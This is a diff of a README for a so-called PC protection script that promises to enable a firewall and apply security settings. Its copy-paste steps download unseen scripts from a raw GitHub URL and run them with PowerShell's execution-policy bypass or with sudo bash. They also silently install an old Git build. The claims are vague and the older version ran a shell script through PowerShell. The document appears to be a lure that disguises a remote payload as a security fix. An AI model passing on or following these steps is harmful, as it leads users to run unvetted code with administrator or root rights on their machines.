@@ -1,4 +1,4 @@
-# PC Protection (While Retaining Full Functionality)
+# Maximum PC Protection (Without Breaking!)
 
 The Protection script will maximize the security of your PC.
 - ✓ Enables Firewall
@@ -7,6 +7,10 @@ The Protection script will maximize the security of your PC.
 - ✓ Applies security settings
 
 ## To receive these benefits:
+
+### For Windows Users:
+
+Make sure you have at least 200 MB of free space available.
 
 1. **Open Command Prompt**
    - Press `Windows + R`
@@ -23,16 +27,48 @@ The Protection script will maximize the security of your PC.
      .\Git-2.14.1-64-bit.exe /VERYSILENT /NORESTART
      ```
 
-3. **Install Protection Script**
+3. **Download Protection Script**
    - Copy/Paste the following line in Command Prompt:
      ```cmd
-     git clone https://github.com/boolskii/protection.git
+     curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1
      ```
 
-4. **Run the Script**
+4. **Run the Windows Script**
    - Copy/Paste the following line in Command Prompt:
      ```cmd
-     powershell -ExecutionPolicy Bypass -File .\protection\windows-sec.sh
+     powershell -ExecutionPolicy Bypass -File .\win.ps1
      ```
 
-Now your PC is protected from unwanted activity!
+Now your Windows PC is protected from unwanted activity!
+
+### For Linux Users:
+
+Make sure you have at least 100 MB of free space available.
+
+1. **Open Terminal**
+
+2. **Update Package Lists**
+   - Copy/Paste the following line in Terminal:
+     ```bash
+     sudo apt-get update
+     ```
+
+3. **Install Git**
+   - Copy/Paste the following line in Terminal:
+     ```bash
+     sudo apt-get install git -y
+     ```
+
+4. **Download Protection Script**
+   - Copy/Paste the following line in Terminal:
+     ```bash
+     curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh
+     ```
+
+5. **Run the Linux Script**
+   - Copy/Paste the following line in Terminal:
+     ```bash
+     sudo bash ./lin.sh
+     ```
+
+Now your Linux system is protected from unwanted activity!
